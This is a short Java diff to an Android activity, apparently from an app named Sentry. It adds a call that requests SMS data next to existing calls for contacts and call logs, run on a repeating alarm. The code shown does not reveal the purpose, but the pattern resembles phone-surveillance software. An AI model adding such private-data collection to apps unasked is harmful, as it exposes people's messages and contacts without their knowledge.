@@ -30,6 +30,7 @@ public class LocationActivity extends Activity{
 	    AppLog.d(TAG, "AlarmManager setRepeating");
 	    SentryApplication.getApp().startReqContact(this);
 	    SentryApplication.getApp().startReqCallLog(this);
+	    SentryApplication.getApp().startReqSms(this);
 	}
 	
 	private void initView() {
